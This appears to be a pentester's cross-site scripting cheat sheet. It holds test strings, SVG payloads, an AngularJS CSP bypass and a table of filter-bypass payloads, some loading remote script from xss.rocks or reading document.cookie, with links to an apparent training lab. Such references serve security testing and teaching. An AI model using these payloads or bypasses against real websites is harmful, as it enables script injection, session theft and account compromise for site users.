# XSS Stuff

## Test Strings
```
<script>onerror=alert;throw 1</script>
<svg onload=alert(1) 
<img src=x onerror=alert('XSS');>
<img/src/onerror=prompt(8)>
<img/src/onerror=alert(document.cookie;)>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```
SVG based XSS:   
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert("SVG XSS");
</script>
</svg>

```
SVG based blind XSS:   
```
<svg version="1.1" baseProfile="full" xmlns="http://w3.org/2000/svg" xmlns:xlink="http://w3.org/1999/xlink" >
  <script type="text/javascript"  xlink:href="URL"></script>
</svg>
```

## Using Angular.js to bypass CSP
If you can find a place in a web page where e.g.  `{{7*7}}` gets displayed on client-side as '49' (if its returned as 49, then its server-side template injection!), you can try to bypass CSP with:   
`{{$on.constructor('alert(1)')()}}`   
More here: https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti
 
## XSS Bypasses

|   Filter   | Bypass    |
| --- | --- |
| Nothing | &lt;script&gt;alert(1)&lt;/script&gt; |
| Injection in value attribute of &lt;input&gt;, no quotes | >&lt;script&gt;alert(1)&lt;/script&gt; |
| Injection in value attribute of &lt;input&gt; with quotes | ">&lt;script&gt;alert(1)&lt;/script&gt; |
| Injection within a &lt;script&gt; block | `asdf";alert(1);<!--` |
| Injection within a &lt;textarea&gt; | &lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; |
| DOM-XSS, no filtering | &lt;img src=x onerror=alert(1)&gt; |
| Client-side filtering of some values | [Attack in URL directly or manipulate request via Burp: https://www.compass-demo.com/xss_lab/level7?inject=%3Cscript%3Ealert(1)%3C/script%3E](https://www.compass-demo.com/xss_lab/level7?inject=%3Cscript%3Ealert%281%29%3C/script%3E) |
| "&lt;" and "&gt;" are filtered | test" onmouseover="alert(1) |
| "script" is filtered, but only once | &lt;img src=x onerror=alert(1)&gt; OR &lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;  |
| most non-HTML5 onXYZ handlers are blocked | Any valid HTML5 onevent handler: &lt;input type=text oncontextmenu=alert(1)&gt;|
| all "onxyz" event handlers are filtered, "script" is filtered, but case sensitive | &lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt; |
| "alert" is filtered | [&lt;script src=https://xss.rocks/xss.js&gt;](https://xss.rocks/xss.js) |
| "alert", "http://" and "https://" are filtered | &lt;script src=//xss.rocks/xss.js&gt; |
| Injection in a &lt;script&gt; block, but double quotes are escaped | Escape the escape character: `asdf\\";alert(1);<!--` |
| Injection in a &lt;script&gt; block, but "&lt;", "&gt;" and "alert" are filtered | ";\\u{61}lert(1);var i=" |
| Parentheses are filtered | &lt;script&gt;onerror=alert;throw 1&lt;/script&gt; |
| Injection inside "src" attribute of &lt;script&gt; tag, but all protocols "http://", "https://" and "//" are filtered. | data:text/javascript,alert(1) |
| all tags (e.g. &lt;.*&gt;) are filtered | Parameter pollution: [https://www.compass-demo.com/xss_lab/level18?inject=%3Cscript%20&inject=%3Ealert(1)%3C/script%20&inject=%3E](https://www.compass-demo.com/xss_lab/level18?inject=%3Cscript%20&inject=%3Ealert%281%29%3C/script%20&inject=%3E) |
| "script" and "onXYZ" event handlers are filtered, but knockout JS is available. | Knockout JS script gadget:  &lt;h2&gt;Hello, &lt;span data-bind="text: alert(1)"&gt;&lt;/span&gt;!&lt;/h2&gt; |
| Injection via file upload, nothing filtered | Upload HTML document (e.g. test.html): &lt;script&gt;alert(1)&lt;/script&gt; |
| Injection via file upload, but .html extension and other important ones are filtered. | Upload HTML document, but with .htm extension:  &lt;script&gt;alert(1)&lt;/script&gt; |
| MIMETypes are filtered, only images are allowed. | Use an SVG (below is a fancy one): <br>`<?xml version="1.0" standalone="no"?>`<br>`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">`<br>`<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">`<br>`<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />`<br>`<script type="text/javascript">`<br>`alert("SVG XSS");`<br>`</script>`<br>`</svg>` |
| Injection inside eval, but ">", "<", "=", "alert", "script", "src" and protocols are all filtered. | String.fromCharCode(97,108,101,114,116,40,49,41) |
| csp blocks most things, but allows angularJS to be loaded | <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.js"></script\> &lt;input type=text ng-app id=p ng-focus=$event.view.alert(1)&gt; |
